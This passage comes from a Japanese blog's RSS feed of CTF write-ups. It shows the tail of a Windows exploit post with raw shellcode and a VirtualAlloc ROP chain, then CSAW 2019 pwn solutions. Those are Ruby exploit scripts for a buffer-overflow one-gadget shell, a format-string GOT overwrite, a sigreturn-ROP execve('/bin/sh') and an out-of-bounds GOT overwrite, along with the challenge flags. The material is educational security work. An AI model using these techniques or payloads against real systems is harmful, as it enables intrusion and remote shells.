shellcode &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\xFC\xEB\x67\x60\x33\xC0\x64\x8B\x40\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x89\x44\x24\x1C\x8B\x68\x10\x8B\x45\x3C\x8B\x54\x05\x78\x03\xD5\x8B\x4A\x18\x8B\x5A\x20\x03\xDD\xE3\x39\x49\x8B\x34\x8B\x03\xF5\x33\xFF\x33\xC0\xAC\x84\xC0\x74\x07\xC1\xCF\x0D\x03\xF8\xEB\xF4\x3B\x7C\x24\x24\x75\xE2\x8B\x5A\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5A\x1C\x03\xDD\x8B\x04\x8B\x03\xC5\x89\x44\x24\x1C\x61\x59\x5A\x51\xFF\xE0\x8B\x74\x24\x1C\xEB\xA6\x68\x6B\x65\x79\x00\x8B\xC4\x6A\x00\x6A\x00\x50\x68\x6E\x0C\x2E\xE1\xE8\x83\xFF\xFF\xFF\x8B\xD8\x68\x00\x01\x00\x00\x8D\xAC\x24\x00\x01\x00\x00\x55\x53\x68\xA4\x09\x0E\xE7\xE8\x69\xFF\xFF\xFF\x68\x00\x01\x00\x00\x55\x6A\x01\x68\xD5\x8A\xA7\x67\xE8\x57\xFF\xFF\xFF\x68\x7E\xD8\xE2\x73\xE8\x4D\xFF\xFF\xFF\x00\x00\x00\x00\x6E\x8F\x87\x5D\x00\x00\x00\x00\x0D\x00\x00\x00\x40\x00\x00\x00\x1C\x20\x00\x00\x1C\x04\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\xB6\x00\x00\x00\x2E\x74\x65\x78\x74\x24\x6D\x6E\x00\x00\x00\x00\x00\x20\x00\x00\x1C\x00\x00\x00\x2E\x72\x64\x61\x74\x61\x00\x00\x1C\x20\x00\x00\x50\x00\x00\x00\x2E\x72\x64\x61\x74\x61\x24\x7A\x7A\x7A\x64\x62\x67\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1028&lt;/span&gt;          &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# 1028 byte&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(pop_ecx_ret)   &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Overwrite return address&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;936&lt;/span&gt;)           &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# ecx &amp;lt;- 936&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(jmp_memory)    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# jmp dword [0x401160+ecx*4] -&amp;gt; 0x402000 (VirtualAlloc)&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(stack_addr&lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;44&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# the head address of shellcode&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(stack_addr)    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# lpAddress&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;1024&lt;/span&gt;)          &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# dwSize = 1024&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;0x1000&lt;/span&gt;)        &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# flAllocationType = MEM_WRITE&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;0x40&lt;/span&gt;)          &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# flProtect = PAGE_EXECUTE_READWRITE&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; shellcode
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Send payload&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以下が実行結果である。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/U7pR2SU&#34; alt=&#34;x.rbの実行結果&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;4-おわりに&#34;&gt;4. おわりに&lt;/h2&gt;

&lt;p&gt;本記事では、CTFの問題を使ってWindows におけるExploitのための環境構築方法やLinuxとの差について簡単に記した。本問題は、古い問題のためセキュリティ機構などもゆるい。現実の世界でのExploitは、もっと難しいはずだ。しかしながら、本問題のような簡単なBOFを利用したROPなどの古典的なテクニックを理解しておくことで、脅威の度合いについて正しく理解できるだろう。余力があれば、さらに異なるWindows Exploit 問題のWriteupを書いていきたい。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Csaw2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/csaw2019/</link>
      <pubDate>Mon, 16 Sep 2019 09:50:28 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/csaw2019/</guid>
      <description>

&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;

&lt;h3 id=&#34;mcgriddlev2&#34;&gt;mcgriddlev2&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;問題文にFLAGが記載されている&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;flag{W3lcome_7o_CSAW_QUALS_2019!}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;

&lt;h3 id=&#34;baby-boi-50pt&#34;&gt;baby_boi (50pt)&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;シンプルなBOFでIPが奪える問題&lt;/li&gt;

&lt;li&gt;&lt;p&gt;libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;8888&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1005&lt;/span&gt;
libc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./libc-2.27.so&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#libc = ELF.new &amp;#34;/lib/x86_64-linux-gnu/libc-2.29.so&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
libc_printf &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/: (.+)/&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_printf &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;printf&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% libc_base
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;payload &lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x4f322&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline(payload)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{baby_boi_dodooo_doo_doo_dooo}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;got-milk-50pt&#34;&gt;GOT Milk? (50pt)&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;独自の共有オブジェクトとバイナリが配られる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set LD_LIBRARY_PATH ./&lt;/code&gt; でカレントディレクトリの共有オブジェクトを見るようにする&lt;/li&gt;

&lt;li&gt;&lt;p&gt;FSBがあるので、それを使ってGOT Overwriteする&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;fsa&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#$z = Sock.new &amp;#34;localhost&amp;#34;, 8888&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1004&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
value &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x89&lt;/span&gt;
fmt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;FSA&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new()
fmt&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x804a010&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; value
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; fmt&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;payload(&lt;span style=&#34;color:#666&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# index of argument&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline(payload)
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{y0u_g00000t_mi1k_4_M3!?}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;small-boi-100pt&#34;&gt;small_boi (100pt)&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;statically linked でstrippedな小さなバイナリが与えられる&lt;/li&gt;

&lt;li&gt;&lt;p&gt;sig_return システムコールを呼ぶようなraxの設定のされ方があるのと自明なBOFがあるので、Sigreturn ROP (SROP) で &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)&lt;/code&gt; を実行する&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SROPは、スタックの値を使ってsig_return実行時にレジスタの値を代入する攻撃&lt;/li&gt;

&lt;li&gt;&lt;p&gt;これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#$z = Sock.new &amp;#34;localhost&amp;#34;, 8888&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1002&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x28&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x40017c&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;4&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# r8~r15&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x4001ca&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rdi = /bin/sh&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rsi&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rbp&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# &lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# &lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x3b&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rax = 0x3b &lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rcx&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)   &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rsp&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x00400185&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rip = syscall&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# eflags&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0x33&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# cs&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0x2b&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# ss&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# err ~ union&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# reserved[8]&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{sigrop_pop_pop_pop}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;traveller&#34;&gt;traveller&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;解けなかったのでwriteupを見た&lt;/li&gt;
&lt;li&gt;Off-by-oneがあるためHeap問題かと思ったら操作対象のインデックスの入力に負数が入力できるOOB問題&lt;/li&gt;

&lt;li&gt;&lt;p&gt;編集コマンドで、&lt;code&gt;-50&lt;/code&gt; をするとfree@gotを書き換えられたのでこれを使って&lt;code&gt;cat_flag&lt;/code&gt;関数に飛ばす&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1003&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#elf = ELF.new &amp;#34;./traveller&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#libc = ELF.new &amp;#34;./libc-2.23.so&amp;#34;&lt;/span&gt;
context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;add&lt;/span&gt;(dist, dest)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dest
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;change&lt;/span&gt;(dist, dest)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;send dest
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;delete&lt;/span&gt;(dist)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;
